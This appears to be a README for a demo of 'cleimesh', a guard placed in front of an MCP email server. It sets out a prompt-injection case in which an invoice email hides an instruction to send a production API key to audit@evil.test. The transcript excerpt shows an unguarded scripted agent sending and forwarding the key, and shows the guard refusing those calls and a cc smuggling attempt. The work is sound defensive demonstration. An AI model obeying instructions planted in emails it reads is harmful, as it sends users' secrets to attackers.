# An injected email can't send your secrets

A real mail server ([GreenMail](https://greenmail-mail-test.github.io/greenmail/), SMTP and IMAP) and a
popular email MCP server, [`mcp-email-server`](https://github.com/Wh1isper/mcp-email-server), unmodified.
The inbox holds a production API key and a vendor invoice with a hidden instruction: send the key to
`audit@evil.test`. A scripted agent (no model; it does what an injected one would) reads the inbox and
follows the instruction, twice: first talking to the email server directly, then behind one command.

```sh
cleimesh mcp add mail --tool list_emails_metadata --tool get_emails_content --tool send_email --tool forward_email \
  --taints list_emails_metadata --taints get_emails_content \
  --clean-only send_email --clean-only forward_email \
  --when-tainted send_email.account_name=work --when-tainted send_email.recipients=boss@corp.test \
  --when-tainted send_email.subject='*' --when-tainted send_email.body='*' -- mcp-email-server stdio
```

![One email asked for the key: without cleimesh the injected agent sends and forwards it, 2 mails reach the attacker; with one cleimesh mcp add in front of the same server both are refused and the attacker gets 0](fig-email.png)

![The same run in a terminal: the agent straight to mcp-email-server leaks twice; behind cleimesh, send_email and forward_email are refused and audit verify checks 8 receipts](email.gif)

From the [transcript](transcript.txt):

```
== WITHOUT cleimesh
  4. send_email to audit@evil.test (injected)    -> ok
  5. forward_email #1 to audit@evil.test         -> ok
  mails in audit@evil.test (the attacker): 2

== WITH cleimesh
  4. send_email to audit@evil.test (injected)    -> REFUSED | ... received untrusted content ...
  5. forward_email #1 to audit@evil.test         -> REFUSED
  6. send_email to boss@corp.test (allowed)      -> ok
  7. send_email to boss + cc audit@evil.test     -> REFUSED | ... argument cc is not allowed once tainted ...
  mails in audit@evil.test (the attacker): 0
  mails in boss@corp.test (allowed while tainted): 1
```

Reading mail taints the agent: a subject line is attacker-controlled too, so the inbox listing counts. Once
tainted, the agent can still read and can still mail `boss@corp.test`, the one address `--when-tainted` keeps
for it. Everything else is refused: other recipients, forwarding, and any argument the rule doesn't name (step 7
puts the attacker in `cc`). The values are fixed in the token on purpose; "reply to the sender" would hand the
address to the attacker. A human can lift the taint
(`cleimesh taint clear <holder> --reason "..."`, itself a receipt). `cleimesh taint list` names the receipt that tainted it; `cleimesh audit verify`
checks all eleven.

The token also narrows the server to the four tools granted: the agent sees 4 of the server's 21 (no
`email_command`, no `delete_emails`).

## Run it

Needs Docker. Everything stays on a private Docker network; the key is fake.

```sh
examples/email/run.sh
```

`run.sh` starts GreenMail with two mailboxes (`agent@corp.test`, `audit@evil.test`), seeds the inbox
(`seed.py`), runs `driver.py` against the server directly, counts the attacker's mail (`count.py`), then
does the same on a fresh mail server with the server added through `cleimesh mcp add`. The image installs the
latest `cleimesh` release and `mcp-email-server` with `uv`. `config.toml` holds the demo mailbox's password
in plain text; use the server's keyring storage for a real account.

`mcp-email-server` has its own recipient allowlist (`allowed_recipients`), and it is worth setting. It
decides by address, before and after the agent read anything. The demo sets it to `*`, as a mailbox that
replies to customers would; taint decides by what the agent has read.

The GIF is `gif.sh` recorded with asciinema and rendered with agg; it shortens the refusal lines for the screen.
